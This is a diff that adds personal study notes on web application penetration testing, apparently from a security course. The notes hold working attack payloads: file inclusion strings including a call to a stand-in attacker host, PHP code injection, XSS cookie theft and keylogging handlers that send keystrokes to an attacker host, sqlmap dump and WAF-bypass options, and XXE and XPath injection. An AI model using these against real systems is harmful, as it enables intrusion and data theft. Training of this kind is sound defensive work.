@@ -1,0 +1,376 @@
+Filter by Status code - 4xx are disabled by default in burp
+
+Proxy Options:
+	Convert HTTPS links to HTTP -> SSLStrip equivelent
+	remote secure flag from cookies -> checks for validation of secure flag
+	unhide hidden form fields
+
+Intruder:
+	Sniper -> Each position is fuzzed, one at a time
+	Battering Ram -> One set of payloads is injected into all positions
+			 Useful if more then one parameter needs to be set the
+			 same
+	Pitchfork -> eash position is fuzzed simultaneously
+		     useful if related injections are needed
+		     multiple paload lists
+	Cluster bomb -> Iterates through each positions payload
+			similar to sniper except for multiple positions at once
+
+	FuzzDB -> collection of web app specific lists, use with intruder
+
+Mutillidae -> web app vulnerable to OWASP top 10
+
+File Inclusion Across Languages:
+	PHP 		require() and include()
+			code execuation
+	ASP(.NET)	Response.WriteFile()
+			no code execution
+	ASP(.NET)	Server.Execute()
+			code execution, web root access only
+	JSP		<jsp:include page="" />
+			code executino, web root access only
+
+Rob Fuller from mubix -post explotation doc and what to steal - Room 362
+
+Local File Include:
+Use PHP to grab other php files for source code disclosure -> must prevent
+	PHP execution to do this.  Otherwise PHP will render content.
+	Encode to Base64, then display:
+		php://filter/read=convert.base64-encode/resource=filename
+			Base64 encoded data can't be rendered.
+		http://site.com/fileview.php?loc=/etc/passwd
+		http://site.com/fileview.php?loc=/php://filter/read=convert...
+
+
+Remote File Include:
+http://site.com/blog.php?page=http://127.0.0.1/blog.php
+	if site shows up twice you are vulnerable to RFI
+If a firewall blocks your RFI that actually calls a remote file:
+	http://atacker:53/shell.txt
+
+	<?php system('ls'); ?>    -> base64 encode this
+
+	Create a local file with:
+	<form action="http://site.com/fileview.php?loc=php://input method="post" enctype="text/plain">
+	<input type="text" name="exploit" value="<?php phpinfo(); ?>" />
+	</form>
+
+	/fileview.aspx?loc=\\attacker\mal\mal.txt
+
+PHP session file:
+	/var/lib/php5/sess_[session ID/cookie]
+	
+	login to php page with: ted<?php phpinfo(); ?>
+	if username stays populated with the above login you know it is stored
+	now goto:
+		http://site.com/blog.php?page=/var/lib/php5/sess_[session ID]
+	phpinfo page should be displayed
+
+PHP on Windows:
+	< translates to *
+	All files uploaded in php are temp stored in C:\windows\temp\php??.tmp
+	so you can do this:
+		fileview.php?loc=C:\Windows\Temp\php<.tmp
+			shows files uploaded in php
+
+Redo lab on pages 31-44 in Lab WORKBOOK (File Upload to Code Exec) 
+	all files stored in VM Sec642-FileUploadTarget
+
+
+Collection of backdoor web shells:
+	http://laudanum.sourceforge.net
+
+SQLi
+	[o] show rows starting with this offset
+	[r] rows of output to display
+	MySQL	WHERE id = 0 UNION SELECT 'data' LIME [o], [r]
+	MSSQL	WHERE id = 0 UNION SELECT 'TOP [r] 'data' WHERE
+			data_column NOT in (SELECT TOP [o] 'data')
+
+	Mavi Tuna -> good sql injectin cheat sheet
+
+	Havij -> windows based SQL injection tool
+		http://itsecteam.com/en/projects/project1.htm
+
+	SQLmap -> can take logs from burp
+		./sqlmap.py -l /tmp/burp.log --scope="site.org"
+		--prefix="')"	-> tell burp all queries begin with this
+		--suffix=" AND ('a'='a"
+		--technique=BT
+			Default: BEUST
+			B boolean
+			E error
+			U union
+			S stacked query
+			T timing
+		--replicate	-> replicates db in sqlite3
+		--dump
+		-T <table> 	-> dump table by name
+		-C <column name> 
+		--level=5
+		--risk=3
+		--flush-session	  -> flush stored data from existing scans
+		--string="<text>" -> indicates to sqlmap a valid query
+
+XSS
+<"8-')>
+<img src="//site.com/img.jpg" on mouseover="alert('Jimmy')">
+	image doesn't actually need to exit
+<img src="//site.com/img.jpg" on error="alert('Jimmy')">
+
+<a href="/" style="background-image: expression(alert('Jimmy;))">
+
+DOM-based XSS
+	The client uses the URL within the DOM
+	Examples of inputs (or sinks) are:
+		cookies
+		the referer
+		dialog inputs	
+		XMLHTTPRequest Responses
+	Tools: -> DOMinator - firefox extension
+		http://code.google.com/p/dominator
+			it extends firebug to detect D-XSS flaws
+		passive monitoring
+
+Keystroke logging:
+	Form fileds -> only grabs the field contents:
+	onblur="javascript:document.write('<img src=//attackert/'+this.value);"
+	
+	OnKeyPress event handling:
+	onkeyup="javascript:document.write('<img src=//attackert/'+this.value);"
+
+BeEF
+	Admin Port 3000
+	Hook capabilities: hook.js
+	Proxy Server Port 6789
+		used for enabling proxying through a victim browser
+		THis enables us to configure our browswer to use the BeEF 
+		server as its proxy server.  The requests will then be sent
+		through the victim.
+
+	Modules status based on hooked victims user agent:
+	Green 	Works on the victim
+	Orange	Works but may be visible
+	White	Not confirmed to work
+	Red	Doesn't Work
+
+	Metasploit Integration
+		Metasploit needs to be reachable from the victim
+
+	XSSRays - a XSS site scanner delivered via the hooked browser
+
+
+
+
+Blind Elephant
+	./BlindElephant.py -l
+		List supported apps and plugins
+	./BlindElephant.py http://site.org/app guess
+		guess installed apps
+
+Sharepoint:
+	ShareDiggity -> Sharepoint recon tool from Stach and Liu
+
+
+Wordpress:
+	wpscan
+	Basic Scan:
+	./wpscan.rb --url http://wp.sec642.org/wordpress/
+	Enumerate Plugins:
+	./wpscan.rb --url http://wp.sec642.org/wordpress/ --enumerate p
+	Brute force admin password:
+	./wpscan.rb --url http://se.org/ --wordlist ./list.txt --username Admin
+
+Crypto:
+	http://www.willhackforsushi.com/code/ecb_encrypt_image.zip
+		will encrypt image with AES-ECB and show randomness or lack of
+
+	1f8b hex header for gzip format
+
+	ent	attempts to determine entrophy (randomness)
+			bigger number is better
+		ent file1.bin |grep Entrophy
+
+	HashCalc	-> Computes hash for text string, hex string or file 
+			   free tool from SlavaSoft
+
+
+	IV is typically first half of session -> use bit flipping attack here
+	Ciphertext is typicaly the second half
+
+	padbuster ->exploit tool for padding oracle vulnerabilities by
+		    Brian Holyfield
+
+	perl padbuster.pl "http://site.com/captcha.php?enc=<key> <key> 8 -encoding 1
+
+	To graffeti a captcha:
+	perl padbuster.pl "http://site.com/captcha.php?enc=<key> <key> 8 -encoding 1 -plaintext PWNED
+		
+
+WAF
+http://projects.webappsec.org/Web-Application-Firewall-Evaluation-Criteria
+
+	Amazon:
+		Enforcer plug-in
+		Hyperguard Decider Cloud
+
+
+	OpenSource:
+		Aqtronix WebKnights (IIS)
+		IronBee	
+		EASPI WAF
+		ModSecurity
+
+	ModSecurity
+		apt-get install libapache-mod-security
+		mkdir /etc/apache2/logs/
+		cp -R /user/share/doc/mod-security-common/examples/rules /etc/apache2/
+		Edit /etc/apache2/conf.d/security and add:
+			<IfModule mod_security2.c>
+			   Include /etc/apache2/rules/*.conf
+			   Include /etc/apache2/rules/base_rules/*.conf
+			</IfModule>
+		Enable Mod Security:
+		a2enmod mod-security
+		/etc/init.d/apache2 restart
+
+		Disable mod_security:
+		a2dismod mod-security
+
+		https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project
+		rules-updater.pl -r http://www.modsecurity.org/autoupdate/respository/ -1
+
+		Phases:
+			1. REQUEST_HEADERS
+			2. REQUEST_BODY
+			3. RESPONSE_HEADERS
+			4. RESPONSE_BODY
+			5. LOGGING
+
+		Example Rules:
+			SecRule REQUEST_METHOD "!@rx ^(?:GET|HEAD)$"
+			"phase:1,t:none,block,msg:'Method not allowed',logdata:
+			%{REQUEST_METHOD}"
+
+			SecRule REQUEST_HEADERS:User-Agent "@rx nikto"
+			phase:1,log,deny,msg:"GOTCHA!!!"
+
+WAF Detection:		
+nmap --script http-waf-detect site.org
+w3af -> Discovery -> fingerprint_WAF
+waffit   ./wafw00f.py -v http://site.org
+
+Generating Data URIs:
+	www.scalora.org/projects/uriencoder/
+	software.kixie.ch/utilities/cgi/data/data
+
+	datauri-generator.py
+
+	base64 encode <script>alert(1)</script>
+	site.org/index.php?lang=<object data="data:text/html;base64,<encoded data>"></object>
+	<hr onload="alert(1)">
+	<img src="broken" onerror="alert(document.cookie)">
+	<!--><img src="broken" onerror="alert(document.cookie)">-->
+
+
+SQLMap
+	--check-payload  ->helps bypass WAF
+	--check-waf	 ->looks at responses to see if blocking is occuring
+	Tamper Scripts
+		/opt/samurai/sqlmap/tamper/
+		apostrophemask.py
+		space2plus.py
+		etc
+	--tamper tamper/randomcomments.py
+	--tables -> lists tables in the DB
+	can crack mysql hashed passwords
+
+Mobile:
+	MobiSec Live Environment -> mobisec.secureideas.net
+		Donated to OWASP
+		Includes tools for pen testing, secure development, forensics
+	
+	OWASP Mobile top 10:
+		https://www.owasp.org/index.php/OWASP_Mobile_Security_Project
+		tools, guidelines, standards
+	
+	Mallory -> transparent TCP and UDP proxy, not just a web proxy
+		uses IP tables and network adapters, it becomes our gateway
+		http://intrepidusgroup.com/insight/mallory/
+
+	SecurityCompass ExploitMe Mobile LabServer
+		https://github.com/securitycompass/LabServer
+		https://github.com/securitycompass/AndroidLabs
+
+	WSAttacks -> Good for fuzzing, has wiki
+			wsattacks.org???
+
+Web Services:
+	ReST	Representational State Transfer
+		uses HTTP methods, employees alternamte HTTP methods
+		isn't very different from normal web traffic
+		can use normal testing procedues on them
+		less complex and less overhead
+	SOAP	Simple Object Access Protocol
+		SOAPUI - soapui is a test framework
+		Proxy SOAPUI to burp, then have burp do a scan
+		
+	WSDL	Web Services Discription Language
+		describes the functionality offered by a web server
+		the location of the service
+		how to invoke the service
+		XML based
+		We can manually browse to the WSDL during testing	
+	
+	Specific Attacks:
+		XPath Injection
+		External Entity Attack
+
+	Ken Johnson -> cktricky -> extending testing on web services for soap
+			Burp exention 
+	
+
+Entity's
+	<!ENTITY intra SYSTEM "http://intranet/index.html">
+	<!ENTITY pass SYSTEM "/etc/passwd">
+
+	
+XPATH -> Pull informatino from XML
+	* is a wildcard
+	@ is used to select attributes
+	. and .. current and parent node respectively
+	//Members 	->returns all of the members in a phonebook
+	[Name="Tony*"]	->return names that start with Tony
+	//@type="office" ->return all attributes of a specific type
+	
+	Expected Input:
+		Brenna
+	Attacker Input:
+		Brenna" or "*"="
+
+	Finding Web Services on Google
+		filetype:wsdl wsdl site:site.com
+
+	
+UDDI -> Universal Description, Definition, Integration Specification 
+	core part of Web Services
+	Designed to be queried by SOAP to point users to the WSDL file
+	Phonebook of web services
+	Public UDDI directories:
+		uddi.microsoft.com
+		uddi.ibm.com
+	
+
+
+	
+		
+WSFuzzer -> fuzz soap based web services -
+	http://www.owasp.org/index.php/Category:OWASP_WS_Fuzzer_Project
+	./WSFuzzer.py -w http:/site.org/site?wsdl
+	
+
+
+
+
+
+
